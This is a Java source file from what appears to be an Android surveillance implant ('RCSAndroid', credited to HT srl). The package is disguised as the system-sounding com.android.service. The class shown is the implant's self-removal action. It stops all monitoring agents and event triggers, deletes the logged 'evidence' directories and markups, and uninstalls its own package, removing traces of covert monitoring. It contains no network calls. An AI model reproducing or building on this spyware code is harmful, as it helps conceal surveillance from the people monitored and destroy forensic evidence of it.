/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : UninstallAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import com.android.service.Status;
import com.android.service.agent.AgentManager;
import com.android.service.event.EventManager;
import com.android.service.evidence.EvidenceCollector;
import com.android.service.evidence.Markup;

import android.content.Intent;
import android.net.Uri;
import android.util.Log;

// TODO: Auto-generated Javadoc
/**
 * The Class UninstallAction.
 */
public class UninstallAction extends SubAction {

	private static final String TAG = "UninstallAction";

	/**
	 * Instantiates a new uninstall action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public UninstallAction(final SubActionType type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		actualExecute();
		return true;
	}

	/**
	 * Actual execute.
	 */
	public static boolean actualExecute() {
		Log.d("QZ", TAG + " (actualExecute): uninstall");
		boolean ret = stopServices();
		ret &= removeFiles();
		ret &= deleteApplication();

		return ret;
	}

	static boolean stopServices() {
		AgentManager.self().stopAll();
		EventManager.self().stopAll();
		Status.self().unTriggerAll();
		return true;
	}

	static boolean removeFiles() {
		Markup.removeMarkups();
		EvidenceCollector.self().removeLogDirs(Integer.MAX_VALUE);

		return true;
	}

	static boolean deleteApplication() {
		Uri packageURI = Uri.parse("package:com.android.service");
		Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		Status.getAppContext().startActivity(uninstallIntent);
		return true;
	}

	@Override
	protected boolean parse(byte[] params) {
		return true;
	}

}
